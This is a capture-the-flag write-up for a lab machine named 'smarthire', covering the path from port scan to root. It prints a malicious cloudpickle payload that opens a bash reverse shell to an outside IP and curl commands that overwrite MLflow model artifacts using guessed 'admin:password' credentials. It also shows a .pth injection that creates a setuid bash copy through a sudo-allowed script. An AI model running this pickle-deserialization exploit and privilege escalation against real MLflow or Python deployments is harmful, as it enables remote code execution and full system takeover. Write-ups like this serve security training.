# smarthire

```
Nmap scan report for 10.129.245.215
Host is up, received echo-reply ttl 63 (0.068s latency).
Scanned at 2026-09-06 22:37:59 EDT for 10s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLg1Y2xxe0euIHDjjKTIrxL+XZXgsBabs0FMAMKBL8arUuELui3vhlkgcDVGcZ4vFWnsiu4osw5INjfcQGkp2BY=
|   256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPc/kqsR+WxwGPMNTukcYPjzZRGjQL6N+0HsGIS1NV4U
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

---

web service has a /login and /register. it is proxied through nginx but the actual webserver is flask, based on the 404 page

subdomain scan (ffuf) finds models.smarthire.htb

directory fuzzing reveals /dashbord, /predict (authenticated)

weren't easily able to enumerate users. we can create an account.

the dashboard lets us upload a csv to train a model, and another csv to use that model to make a prediction.

theories: vuln in parser? probably not, since its likely the python csv module. vuln in ml framework? prompt injection?

we can't fingerprint the ml framework. if we take a look at models.smarthire.htb though, we get hit with a http basic auth with the real "mlflow". that tells us [mlflow](https://github.com/mlflow/mlflow) is in use.

recent mlflow vulns include hardcoded default creds when basic auth is in use (our case), ssrf, and information disclosure

it does not use the default password. but just "password" works. lol

after logging in we can see the mlflow version in the header: 2.14.1

mlflow uses python deserialization on certain model files, an attack is [described here](https://www.hiddenlayer.com/sai-security-advisory/2024-06-mlflow) with CVE-2024-37059

the application [deserializes python pickle files into models](https://github.com/mlflow/mlflow/blob/master/mlflow/sklearn/__init__.py#L505) when used with the "sklearn" mode.

```python
def _load_model_from_local_file(path, serialization_format, skops_trusted_types=None):
    """Load a scikit-learn model saved as an MLflow artifact on the local file system.

    Args:
        path: Local filesystem path to the MLflow Model saved with the ``sklearn`` flavor
        serialization_format: The format in which the model was serialized. This should be one of
            the following: ``mlflow.sklearn.SERIALIZATION_FORMAT_PICKLE`` or
            ``mlflow.sklearn.SERIALIZATION_FORMAT_CLOUDPICKLE``.
    """

    # ... some checkign of serialization format and MLFLOW_ALLOW_PICKLE_DESERIALIZATION flag

    if serialization_format == SERIALIZATION_FORMAT_SKOPS:
        import skops.io

        return skops.io.load(path, trusted=skops_trusted_types)
    else:
        with open(path, "rb") as f:
            # Models serialized with Cloudpickle cannot necessarily be deserialized using Pickle;
            # That's why we check the serialization format of the model before deserializing
            if serialization_format == SERIALIZATION_FORMAT_PICKLE:
                return pickle.load(f)
            elif serialization_format == SERIALIZATION_FORMAT_CLOUDPICKLE:
                import cloudpickle

                return cloudpickle.load(f)
```

if we train our own model on the main site, we can find our model and its artifacts on models.smarthire.htb:

![pic](/images/20260921_21h55m28s_grim.png)

we are interested in the `python_model.pkl` and the `MLmodel` files.

[mlflow's REST api](https://mlflow.org/docs/latest/api_reference/rest-api.html#upload-artifact) lets us edit these artifacts. what we want to do is update the MLmodel file to specify the `mlflow.sklearn` loader_module and point it at a malicious pickle.

MLmodel:
```yaml
artifact_path: model
flavors:
  python_function:
    cloudpickle_version: 3.1.1
    code: null
    env:
      conda: conda.yaml
      virtualenv: python_env.yaml
    loader_module: mlflow.sklearn
    model_path: python_model.pkl
    python_model: python_model.pkl
    python_version: 3.10.12
    streamable: false
mlflow_version: 2.14.1
model_uuid: b7fcccdec7f84a94ab4f82928c63dd9c
run_id: d97117c8b1f9435d9994048f142c39ce
utc_time_created: '2026-09-22 01:53:29.361970'
```

and a script to generate the malicious pickle:
```python
import cloudpickle
class Bad:
    def __reduce__(self):
        import os
        return (os.system,("bash -c 'bash -i &> /dev/tcp/10.10.15.59/9001 0>&1'",))

with open("python_model.pkl", "wb") as f:
    cloudpickle.dump(Bad(), f)
```

and just replace them on the server:
```bash
curl -X PUT \
    -u admin:password --basic \
    --data-binary @model.pkl \
    -H "Content-Type: application/octet-stream" \
    "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/d97117c8b1f9435d9994048f142c39ce/artifacts/model/python_model.pkl"

curl -X PUT \
    -u admin:password --basic \
    --data-binary @MLmodel \
    -H "Content-Type: application/octet-stream" \
    "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/d97117c8b1f9435d9994048f142c39ce/artifacts/model/MLmodel"
```

now whenever the model is loaded our file should get deserialized. trigger it by doing the "make prediction" on the main page

## foothold + privesc

![first shell](/images/20260921_22h20m00s_grim.png)

right away we can see we are in the `devs` group, and we have sudo perms for this command:

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

checking out that script, the tree has some concept of plugins:

![custom-script-tree](/images/20260921_22h27m02s_grim.png)

interestingly, our group has write perms in the `dev` subdir of `plugins`

the entrypoint begins like this, using `site.addsitedir()` to include the plugin modules. 

```python
import site               
                                                
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"                                                              
                                                
# make plugins importable    
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

the [docs](https://docs.python.org/3/library/site.html#site.addsitedir) for this `addsitedir` function says it will "Add a directory to sys.path and process its .pth files."

lines in the `.pth` file will be added to `sys.path` if they exist. however these files are also a bit infamous, which the docs also hint us about:

> An executable line in a .pth file is run at every Python startup, regardless of whether a particular module is actually going to be used. Its impact should thus be kept to a minimum. The primary intended purpose of executable lines is to make the corresponding module(s) importable (load 3rd-party import hooks, adjust PATH etc). Any other initialization is supposed to be done upon a module’s actual import, if and when it happens. Limiting a code chunk to a single line is a deliberate measure to discourage putting anything more complex here.

we can just execute python in one of these `.pth` files. `addsitedir` will process any `.pth` in the directory it's given. our executable line needs to start with `import`

/opt/tools/mlflow_ctl/plugins/dev/pwn.pth
```python
import os; os.system("cp /bin/bash /tmp/hz ; chmod +s /tmp/hz")
```

then,
```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

![root](/images/20260921_22h46m37s_grim.png)
